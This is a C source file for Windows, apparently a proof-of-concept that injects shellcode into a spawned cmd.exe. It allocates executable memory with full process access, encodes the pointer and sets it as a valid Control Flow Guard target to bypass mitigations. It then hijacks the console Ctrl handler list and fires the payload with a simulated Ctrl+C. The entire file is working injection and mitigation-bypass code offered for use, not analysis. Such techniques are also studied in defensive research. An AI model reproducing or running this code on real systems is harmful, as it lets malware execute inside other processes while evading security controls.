#include "defines.h"

int main(void) {

    WCHAR *str = Build32bitCmdPath();

    DWORD processId = StartVictimProcess(str);
    PPROCESS_INFO ptrProcessInfo = ShellcodeInjection(processId);
    Sleep(2000);

    //Set API's
    if (!InitializeAPIs())
        exit(EXIT_FAILURE);
    else {
        BOOL bSuccess = SetupValidPointer(ptrProcessInfo);
        if (bSuccess == FALSE)
            exit(EXIT_FAILURE);
    }
	//UPDATE THIS TO MATCH THE LATEST KERNELBASE.DLL VERSION
    BOOL bSucc = SearchForSetCtrlHandlerRoutine(ptrProcessInfo);
    if (bSucc == FALSE)
        exit(EXIT_FAILURE);

    bSucc = GetHandlerDataKernelBase(ptrProcessInfo);
    if (bSucc == FALSE)
        exit(EXIT_FAILURE);

    bSucc = ReadRemoteHandlerData(ptrProcessInfo);
    if (bSucc == FALSE)
        exit(EXIT_FAILURE);

    bSucc = PreformeOverwrite(ptrProcessInfo);
    if (bSucc == FALSE)
        exit(EXIT_FAILURE);

    return 0;
}

WCHAR *Build32bitCmdPath() {
    PWSTR pwCmd;
    SHGetKnownFolderPath(&FOLDERID_SystemX86, 0, NULL, &pwCmd);

    WCHAR *CmdPath = calloc(1, MAX_PATH);
    wcscpy(CmdPath, pwCmd);
    wcscat(CmdPath, L"\\cmd.exe");

    return CmdPath;
}

DWORD StartVictimProcess(LPWSTR processName) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    if (!CreateProcessW(NULL, processName, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("Failed to create a console based process.");
        exit(EXIT_FAILURE);
    }
    return pi.dwProcessId;
}

PPROCESS_INFO ShellcodeInjection(DWORD processId) {
    printf("        [STAGE 1 - Shellcode Injection]         \n");

    PPROCESS_INFO p = malloc(sizeof(PROCESS_INFO));
    if (p == NULL)
        return FALSE;

    //Get a valid handle to the process
    printf("\n[!] Getting a handle to the target process. PID: %d\n", processId);
    p->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (p->hProcess == NULL) {
        printf("[X] Failed to obtain a handle to the target process, exitig..\n");
        exit(EXIT_FAILURE);
    }
    else {
        printf("    [+] Process handle: 0x%x\n", (UINT)p->hProcess);
    }

    //Allocate memory for our shellcode in the target proces
    printf("[!] Memory allocation in target process\n");
    
    p->lpBaseAddr = VirtualAllocEx(p->hProcess,
        NULL,
        0x1000,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);
    if (p->lpBaseAddr == NULL) {
        printf("[X] Memory allocation in target process failed, exiting...\n");
        exit(EXIT_FAILURE);
    }
    else {
        printf("    [+] Memory allocated at: 0x%x\n", (DWORD)p->lpBaseAddr);
    }

    //Write our shellcode to the target process
    DWORD BytesWritten = 0;
    printf("[!] Injecting shellcode to target process.\n");
    BOOL bSuccess = WriteProcessMemory(p->hProcess,
        p->lpBaseAddr,
        (LPCVOID)calc,
        sizeof(calc),
        &BytesWritten);
    if (!bSuccess) {
        printf("[X] Failed to inject our shellcode to target process, exiting..\n");
        exit(EXIT_FAILURE);
    }
    else {
        printf("    [+] Shellcode has been injected into target process.\n");
    }

    printf("\n        [STAGE 1 - COMPLETED]         \n");
    p->pid = processId;
    return p;
}

BOOL InitializeAPIs() {
    printf("\n        [STAGE 2 - Bypassing PointerEncoding and CFG]         \n");
    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    HMODULE kernelbase = GetModuleHandle("kernelbase.dll");
    if (ntdll == NULL || kernelbase == NULL)
        return FALSE;

    pfnRtlEncodeRemotePointer = (declaration_RtlEncodeRemotePointer)GetProcAddress(ntdll, "RtlEncodeRemotePointer");
    if (pfnRtlEncodeRemotePointer == NULL)
        return FALSE;

    pfnRtlDecodeRemotePointer = (declaration_RtlDecodeRemotePointer)GetProcAddress(ntdll, "RtlDecodeRemotePointer");
    if (pfnRtlDecodeRemotePointer == NULL)
        return FALSE;

    pfnSetProcessValidCallTargets = (declaration_SetProcessValidCallTargets)GetProcAddress(kernelbase, "SetProcessValidCallTargets");
    if (pfnSetProcessValidCallTargets == NULL)
        return FALSE;

    SetConsoleCtrlHandler_address = (LPVOID)GetProcAddress(kernelbase, "SetConsoleCtrlHandler");
    if (SetConsoleCtrlHandler_address == NULL)
        return FALSE;

    return TRUE;
}

BOOL SetupValidPointer(PPROCESS_INFO p) {
    printf("[!] Encoding pointer\n");
    HRESULT hRes = pfnRtlEncodeRemotePointer(p->hProcess, p->lpBaseAddr, &pvEncodedPtr);
    if (hRes != S_OK) {
        printf("[X] Encoding of pointer has failed.\n");
        return FALSE;
    }
    printf("    [+] Encoded pointer is: 0x%x\n", (DWORD)pvEncodedPtr);
    printf("[!] Set call target vaild for CFG\n");

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    SIZE_T stErr = 0;

    CFG_CALL_TARGET_INFO cti = { 0 };
    cti.Flags = CFG_CALL_TARGET_VALID;

    stErr = VirtualQuery(p->lpBaseAddr, &mbi, sizeof(mbi));
    if (stErr == 0)
        return FALSE;

    cti.Offset = (ULONG_PTR)p->lpBaseAddr -(ULONG_PTR)mbi.AllocationBase;
    pfnSetProcessValidCallTargets(p->hProcess, pvEncodedPtr, 0x1000, 0x1, &cti);
    printf("    [+] Call target validated.\n");
    return TRUE;
}

BOOL SearchForSetCtrlHandlerRoutine(PPROCESS_INFO p) {
    LPVOID lpByte = NULL;
    SIZE_T lpNumberOfBytesRead = 0;
    BOOL bSuccess = FALSE;
    int i;
    printf("[!] Starting to search for SetCtrlHandler routine.\n");
    for (i = 0; i < 200; i++) {
        bSuccess = ReadProcessMemory(p->hProcess, (LPVOID)((LPBYTE)SetConsoleCtrlHandler_address + i), &lpByte, 0x1, &lpNumberOfBytesRead);
        if (!bSuccess) {
            printf("[X] Failed to read memory from process, exiting..\n");
            return FALSE;
        }

        if ((BYTE)lpByte == 0xe8) {
            bSuccess = ReadProcessMemory(p->hProcess, (LPVOID)((LPBYTE)SetConsoleCtrlHandler_address + i + 1), &lpByte, 0x1, &lpNumberOfBytesRead);
            if (!bSuccess) {
                printf("[X] Failed to read memory from process, exiting..\n");
                return FALSE;
            }
            break;
        }
    }

    SetCtrlHandler_address = (LPVOID)((LPBYTE)SetConsoleCtrlHandler_address + i + 5 + (BYTE)lpByte);
    printf("    [+] SetCtrlHandler address is: 0x%x\n", (DWORD)SetCtrlHandler_address);
    return TRUE;
}

BOOL GetHandlerDataKernelBase(PPROCESS_INFO p) {
    LPVOID lpByte = NULL;
    SIZE_T lpNumberOfBytesRead = 0;
    BOOL bSuccess = FALSE;
    DWORD dwThirdMov = 0;
    int i;
    printf("[!] Getting HandlerListLenght address.\n");
    for (i = 0; i < 200; i++) {
        bSuccess = ReadProcessMemory(p->hProcess, (LPVOID)((LPBYTE)SetCtrlHandler_address + i), &lpByte, 0x1, &lpNumberOfBytesRead);
        if (!bSuccess) {
            printf("[X] Failed to read memory from process, exiting..\n");
            return FALSE;
        }

        if ((BYTE)lpByte == 0x8b) {
            dwThirdMov++;
            if (dwThirdMov == 3) {
                bSuccess = ReadProcessMemory(p->hProcess, (LPVOID)((LPBYTE)SetCtrlHandler_address + i + 2), &lpByte, 0x4, &lpNumberOfBytesRead);
                if (!bSuccess) {
                    printf("[X] Failed to read memory from process, exiting..\n");
                    return FALSE;
                }
                break;
            }
        }
    }
    HandlerListLength_kernelbase_adr = (LPVOID)((DWORD)lpByte);
    printf("[+] HandlerListLength address is: 0x%x\n", (DWORD32)HandlerListLength_kernelbase_adr);
    HandlerList_kernelbase_adr = (DWORD)HandlerListLength_kernelbase_adr + 0xFCC; //offset for MS Windows 10 Pro 10.0.17134 Builds 17134
    
    return TRUE;
}

BOOL ReadRemoteHandlerData(PPROCESS_INFO p) {
    SIZE_T stNumberOfBytesRead = 0;
    printf("[!] Locating HandlerList\n");
    BOOL bSuccess = ReadProcessMemory(p->hProcess, HandlerList_kernelbase_adr, &HandlerListAddress, 0x04, &stNumberOfBytesRead);
	printf("Error code is %d", GetLastError());
    if (!bSuccess) {
        printf("[X] Couldn't read HandlerListLenght in the target process, exiting..\n");
        return FALSE;
    }
    printf("    [+] HandlerList is at: 0x%0x\n", (DWORD32)HandlerListAddress);

    bSuccess = ReadProcessMemory(p->hProcess, HandlerListLength_kernelbase_adr, &HandlerLenght, 0x04, &stNumberOfBytesRead);
    if (!bSuccess) {
        printf("[X] Couldn't read HandlerListLenght in the target process, exiting..\n");
        return FALSE;
    }
    printf("    [+] HandlerListLenght is at: 0x%0x\n", (DWORD32)HandlerLenght);
    printf("\n        [STAGE 2 - COMPLETED]         \n");
    Sleep(2000);
    return TRUE;
}

BOOL PreformeOverwrite(PPROCESS_INFO p) {
    DWORD dwLastHandler = ((DWORD32)HandlerLenght - 1) * 4;
    LPVOID lpLastHandlerAddress = (LPVOID)((LPBYTE)HandlerListAddress + dwLastHandler);
    LPVOID lpOriginalHandler = NULL;
    SIZE_T lpNumberOfBytesRead = 0;
    printf("\n        [STAGE 3 - Overwritting last handler and triggering code execution]         \n");
    printf("[!] Saving original value at HandlerList\n");
    BOOL bSucc = ReadProcessMemory(p->hProcess, lpLastHandlerAddress, &lpOriginalHandler, 0x04, &lpNumberOfBytesRead);
    if (!bSucc) {
        printf("[X] Failed to read handler value from target memory.\n");
        return FALSE;
    }
    printf("[+] Original Handler value is: 0x%x\n", (DWORD)lpOriginalHandler);

    HRESULT hRes = pfnRtlDecodeRemotePointer(p->hProcess, (PVOID)lpOriginalHandler, &pvDecodedPtr);
    if (hRes != S_OK) {
        printf("[X] Failed to decode remote pointer, exiting..\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Original Handler decoded value is: 0x%x\n", (DWORD)pvDecodedPtr);

    printf("[!] Overwriting HandlerList item\n");

    bSucc = WriteProcessMemory(p->hProcess, lpLastHandlerAddress, &pvEncodedPtr, 0x04, &lpNumberOfBytesRead);
    if (!bSucc) {
        printf("[X] Failed to overwrite last handler in remote process, exiting..\n");
        exit(EXIT_FAILURE);
    }

    CodeExecution(p->pid);

    Sleep(300);
    printf("[!] Restore HandlerList item\n");
    bSucc = WriteProcessMemory(p->hProcess, lpLastHandlerAddress, &lpOriginalHandler, 0x04, &lpNumberOfBytesRead);
    if (!bSucc)
    {
        printf("[-] Couldn't write to memory in target process, exiting...\n");
        return FALSE;
    }
    printf("\n        [STAGE 3 - COMPLETED]         \n");
    Sleep(4000);

    return TRUE;
}

VOID CodeExecution(DWORD pid) {
    HWND hwnd_other = GetWindowFromPID(pid);
    if (hwnd_other == NULL)
    {
        printf("[-] Couldn't find window...\n");
        exit(EXIT_FAILURE);
    }
    else
    {
        printf("[i] Triggering injection\n");
        SendCtrlC(hwnd_other);
    }
}

HWND GetWindowFromPID(DWORD mypid)
{
    HWND h = GetTopWindow(0);
    while (h)
    {
        DWORD pid;
        DWORD dwTheardId = GetWindowThreadProcessId(h, &pid);
        if (pid == mypid)
        {
            return h;
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return 0;
}

VOID SendCtrlC(HWND hWindow) {
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    ip.ki.wVk = VK_CONTROL;
    ip.ki.dwFlags = 0; //0 for keypress
    SendInput(1, &ip, sizeof(INPUT));
    Sleep(300);
    PostMessage(hWindow, WM_KEYDOWN, 0x43, 0);
    Sleep(300);
    ip.ki.dwFlags = 2; //2 for keyup (we want this, as we don't want to keep a system wide CTRL down)
    SendInput(1, &ip, sizeof(INPUT));
}